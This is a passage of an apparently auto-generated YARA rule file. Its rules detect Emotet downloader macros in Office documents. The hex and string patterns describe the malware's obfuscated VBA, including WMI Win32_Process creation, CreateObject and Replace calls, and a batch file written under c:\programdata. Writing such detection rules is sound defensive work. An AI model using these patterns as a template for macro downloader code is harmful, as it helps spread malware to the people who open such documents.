        $x_1_4 = {2e 43 61 70 74 69 6f 6e 20 2b 20 [0-32] 2e [0-37] 2e 43 61 70 74 69 6f 6e 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PC_2147744196_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PC!MTB"
        threat_id = "2147744196"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {6d 74 6f 6a [0-32] 3a [0-32] 57 [0-32] 69 [0-32] 6e [0-32] 33 [0-32] 32 [0-32] 5f [0-32] 50 [0-32] 72 [0-32] 6f [0-32] 63 [0-32] 65 [0-32] 73 [0-32] 73 [0-32] 22 2c 20 [0-32] 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-21] 2c 20 [0-21] 2c 20 [0-21] 2c 20 [0-21] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-69] 2c 20 [0-69] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 43 61 70 74 69 6f 6e 20 2b 20 [0-32] 2e [0-37] 2e 43 61 70 74 69 6f 6e 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PC_2147744196_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PC!MTB"
        threat_id = "2147744196"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {67 6d 74 6f [0-32] 3a [0-32] 57 [0-32] 69 [0-32] 6e [0-32] 33 [0-32] 32 [0-32] 5f [0-32] 50 [0-32] 72 [0-32] 6f [0-32] [0-32] 63 [0-32] 65 [0-32] 73 [0-32] 73 [0-32] 22 2c 20 [0-32] 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-21] 2c 20 [0-21] 2c 20 [0-21] 2c 20 [0-21] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-69] 2c 20 [0-69] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 43 61 70 74 69 6f 6e 20 2b 20 [0-32] 2e [0-37] 2e 43 61 70 74 69 6f 6e 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PG_2147744246_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PG!MTB"
        threat_id = "2147744246"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {69 6e 6f 6a [0-32] 33 [0-32] 32 [0-32] 5f [0-32] 50 [0-32] 72 [0-32] 6f [0-32] 63 [0-32] 65 [0-32] [0-32] 73 [0-32] 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-21] 2c 20 [0-21] 2c 20 [0-21] 2c 20 [0-21] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-69] 2c 20 [0-69] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {2b 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e [0-32] 2e 43 61 70 74 69 6f 6e 20 2b 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PJ_2147744292_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PJ!MTB"
        threat_id = "2147744292"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {73 3a 57 69 [0-32] 6e [0-32] 33 [0-32] 32 [0-32] 5f [0-32] 50 [0-32] 72 [0-32] 6f [0-32] 63 [0-32] 65 [0-32] 73 [0-32] 73 [0-32] 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-37] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 61 70 74 69 6f 6e 20 2b 20 [0-32] 2e [0-37] 2e 43 61 70 74 69 6f 6e 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PK_2147744297_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PK!MTB"
        threat_id = "2147744297"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {32 5f 50 72 [0-32] 6f [0-32] 63 [0-32] 65 [0-32] 73 [0-32] 73 [0-32] 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-37] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 61 70 74 69 6f 6e 20 2b 20 [0-32] 2e [0-37] 2e 43 61 70 74 69 6f 6e 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {2b 20 52 65 70 6c 61 63 65 28 [0-32] 2c 20 22 [0-16] 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 43 61 70 74 69 6f 6e 20 2b 20 [0-32] 2e [0-32] 2e 43 61 70 74 69 6f 6e 20 2b 20 [0-32] 2e [0-32] 2e 43 61 70 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PK_2147744297_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PK!MTB"
        threat_id = "2147744297"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {52 65 70 6c 61 63 65 28 43 65 6c 6c 73 28 36 32 2c 20 31 29 20 26 20 22 22 20 2b 20 43 65 6c 6c 73 28 36 39 2c 20 31 29 2c 20 22 [0-10] 22 2c 20 22 22 29 20 26 20 22 26 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c [0-10] 2e 62 61 74 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-48] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = "= \" \" & .Name & \" , \" & vbCr & _" ascii //weight: 1
        $x_1_4 = {4d 6b 44 69 72 20 22 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c [0-15] 22 3a}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PL_2147744306_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PL!MTB"
        threat_id = "2147744306"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {32 5f 50 70 [0-32] 72 [0-32] 6f [0-32] 63 [0-32] 65 [0-32] 73 [0-32] 73 [0-32] 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-37] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 61 70 74 69 6f 6e 20 2b 20 [0-32] 2e [0-37] 2e 43 61 70 74 69 6f 6e 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {2b 20 52 65 70 6c 61 63 65 28 [0-32] 2c 20 22 [0-16] 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PM_2147744315_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PM!MTB"
        threat_id = "2147744315"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {73 3a 5e 5f [0-32] 57 [0-32] 69 [0-32] 6e [0-32] 33 [0-32] 32 [0-32] 50 [0-32] 72 [0-32] 6f [0-32] 63 [0-32] 65 [0-32] 73 [0-32] 73 [0-32] 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-37] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 61 70 74 69 6f 6e 20 2b 20 [0-32] 2e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PM_2147744315_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PM!MTB"
        threat_id = "2147744315"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {77 69 6e 33 [0-32] 32 [0-32] 5f [0-32] 50 [0-32] 72 [0-32] 6f [0-32] 63 [0-32] 65 [0-32] 73 [0-32] 73 [0-32] 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-37] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 61 70 74 69 6f 6e 20 2b 20 [0-32] 2e}  //weight: 1, accuracy: Low
        $x_1_4 = {52 65 70 6c 61 63 65 28 [0-32] 2c 20 22 [0-16] 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PM_2147744315_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PM!MTB"
        threat_id = "2147744315"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {57 69 5e 5f [0-32] 6e [0-32] 33 [0-32] 32 [0-32] 50 [0-32] 72 [0-32] 6f [0-32] 63 [0-32] 65 [0-32] 73 [0-32] 73 [0-32] 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-37] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 61 70 74 69 6f 6e 20 2b 20 [0-32] 2e [0-32] 20 5f}  //weight: 1, accuracy: Low
        $x_1_4 = {52 65 70 6c 61 63 65 28 [0-32] 2c 20 22 [0-16] 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PN_2147744347_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PN!MTB"
        threat_id = "2147744347"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 57 [0-32] 69 [0-32] 6e [0-32] 33 [0-32] 32 [0-32] 5f [0-32] 50 [0-32] 72 [0-32] 6f [0-32] 63 [0-32] 65 [0-32] 73 [0-32] 73 [0-32] 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-37] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 61 70 74 69 6f 6e 20 2b 20 [0-32] 2e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PN_2147744347_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PN!MTB"
        threat_id = "2147744347"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 70 [0-32] 57 [0-32] 69 [0-32] 6e [0-32] 33 [0-32] 32 [0-32] 5f 50 [0-32] 72 [0-32] 6f [0-32] 63 [0-32] 65 [0-32] 73 [0-32] 73 [0-32] 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-37] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 61 70 74 69 6f 6e 20 2b 20 [0-32] 2e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PP_2147744375_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PP!MTB"
        threat_id = "2147744375"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 70 [0-32] 57 [0-32] 69 [0-32] 6e [0-32] 33 [0-32] 32 [0-48] 50 [0-32] 72 [0-32] 6f [0-32] 63 [0-32] 65 [0-32] 73 [0-32] 73 [0-32] 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-37] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 61 70 74 69 6f 6e 20 2b 20 [0-32] 2e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PQ_2147744386_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PQ!MTB"
        threat_id = "2147744386"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"winmgmts:Wi\"" ascii //weight: 1
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-37] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 61 70 74 69 6f 6e 20 2b 20 [0-32] 2e}  //weight: 1, accuracy: Low
        $x_1_4 = {52 65 70 6c 61 63 65 28 [0-32] 2c 20 22 [0-16] 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_GG_2147744398_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.GG!MTB"
        threat_id = "2147744398"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {52 00 65 00 70 00 6c 00 61 00 63 00 65 00 28 00 [0-20] 2c 00 20 00 22 00 [0-20] 22 00 2c 00 20 00 22 00 22 00 29 00}  //weight: 1, accuracy: Low
        $x_1_2 = {52 65 70 6c 61 63 65 28 [0-20] 2c 20 22 [0-20] 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 00 43 00 72 00 65 00 61 00 74 00 65 00 28 00 [0-20] 2c 00 20 00 [0-20] 2c 00 20 00 [0-20] 2c 00 20 00 [0-20] 29 00}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 43 72 65 61 74 65 28 [0-20] 2c 20 [0-20] 2c 20 [0-20] 2c 20 [0-20] 29}  //weight: 1, accuracy: Low
        $x_1_5 = ".Caption))" ascii //weight: 1
        $x_1_6 = {3d 00 20 00 43 00 72 00 65 00 61 00 74 00 65 00 4f 00 62 00 6a 00 65 00 63 00 74 00 28 00 [0-20] 28 00 [0-20] 28 00 [0-20] 29 00 29 00 29 00}  //weight: 1, accuracy: Low
        $x_1_7 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-20] 28 [0-20] 28 [0-20] 29 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_GG_2147744398_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.GG!MTB"
        threat_id = "2147744398"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "51"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = "= \"*6723tguT&^$^RFy23uikJGD*6723tguT&^$^RFy23uikJGDw*6723tguT&^$^RFy23uikJGDi*6723tguT&^$^RFy23uikJGD*6723tguT&^$^RFy23uikJGDn" ascii //weight: 10
        $x_10_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-25] 29}  //weight: 10, accuracy: Low
        $x_10_3 = ".ControlTipText +" ascii //weight: 10
        $x_10_4 = {73 20 3d 20 41 72 72 61 79 28 [0-4] 2c 20 [0-30] 2e 20 5f [0-2] 43 72 65 61 74 65 28 [0-30] 2c 20 [0-30] 2c 20 [0-30] 29 29}  //weight: 10, accuracy: Low
        $x_10_5 = "= Replace$(\"" ascii //weight: 10
        $x_1_6 = {3d 20 53 70 6c 69 74 28 [0-30] 2c 20 22 ?? 36 37 32 33 74 67 75 54 26 5e 24 5e 52 46 79 32 33 75 69 6b 4a 47 44 22 29}  //weight: 1, accuracy: Low
        $x_1_7 = {3d 20 53 70 6c 69 74 28 [0-25] 2c 20 22 2a 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((5 of ($x_10_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Emotet_GA_2147744399_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.GA!MTB"
        threat_id = "2147744399"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {52 00 65 00 70 00 6c 00 61 00 63 00 65 00 28 00 [0-20] 2c 00 20 00 [0-20] 2c 00 20 00 22 00 22 00 29 00}  //weight: 1, accuracy: Low
        $x_1_2 = {52 65 70 6c 61 63 65 28 [0-20] 2c 20 [0-20] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 00 43 00 61 00 70 00 74 00 69 00 6f 00 6e 00 20 00 2b 00 20 00 [0-20] 2e 00 [0-20] 2e 00 43 00 61 00 70 00 74 00 69 00 6f 00 6e 00 20 00 2b 00 20 00 [0-20] 2e 00 [0-20] 2e 00 43 00 61 00 70 00 74 00 69 00 6f 00 6e 00 20 00 2b 00 20 00 [0-20] 2e 00 [0-20] 2e 00 43 00 61 00 70 00 74 00 69 00 6f 00 6e 00 20 00 2b 00 20 00 [0-20] 2e 00 [0-20] 2e 00 43 00 61 00 70 00 74 00 69 00 6f 00 6e 00 29 00 29 00}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 43 61 70 74 69 6f 6e 20 2b 20 [0-20] 2e [0-20] 2e 43 61 70 74 69 6f 6e 20 2b 20 [0-20] 2e [0-20] 2e 43 61 70 74 69 6f 6e 20 2b 20 [0-20] 2e [0-20] 2e 43 61 70 74 69 6f 6e 20 2b 20 [0-20] 2e [0-20] 2e 43 61 70 74 69 6f 6e 29 29}  //weight: 1, accuracy: Low
        $n_1_5 = "DebugPrintFile" ascii //weight: -1
        $n_1_6 = "Debug.Print" ascii //weight: -1
        $n_1_7 = "PrintOut" ascii //weight: -1
        $n_1_8 = "preview:=True" ascii //weight: -1
        $n_1_9 = "Calculation" ascii //weight: -1
    condition:
        (filesize < 20MB) and
        (not (any of ($n*))) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PS_2147744433_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PS!MTB"
        threat_id = "2147744433"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 77 [0-21] 69 [0-21] 6e [0-21] 6d [0-21] 67 [0-21] 6d [0-21] 74 [0-21] 73 3a [0-21] 57 [0-21] 69 [0-21] 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-37] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 61 70 74 69 6f 6e 20 2b 20 [0-32] 2e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PS_2147744433_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PS!MTB"
        threat_id = "2147744433"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 61 [0-21] 77 [0-21] 69 [0-21] 6e [0-21] 6d [0-21] 67 [0-21] 6d [0-21] 74 [0-21] 73 [0-21] 3a [0-21] 57 [0-21] 69 [0-21] 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-37] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 61 70 74 69 6f 6e 20 2b 20 [0-32] 2e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PU_2147744455_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PU!MTB"
        threat_id = "2147744455"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {69 6e 6d 6f [0-21] 67 [0-21] 6d [0-21] 74 [0-21] 73 [0-21] 3a [0-21] 57 [0-21] 69 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-37] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PV_2147744466_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PV!MTB"
        threat_id = "2147744466"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 6f [0-21] 6e [0-21] 33 [0-21] 32 [0-32] 50 [0-21] 72 [0-21] 6f [0-21] 63 [0-21] 65 [0-21] 73 [0-21] 73 [0-21] 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-37] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_QA_2147744521_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.QA!MTB"
        threat_id = "2147744521"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {6e 6d 67 6b [0-21] 6d [0-21] 74 [0-21] 73 [0-21] 3a [0-21] 57 [0-21] 69 [0-21] 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-37] 2c 20 [0-37] 2c 20 [0-37] 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 61 70 74 69 6f 6e 20 2b 20 [0-32] 2e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_QB_2147744539_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.QB!MTB"
        threat_id = "2147744539"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
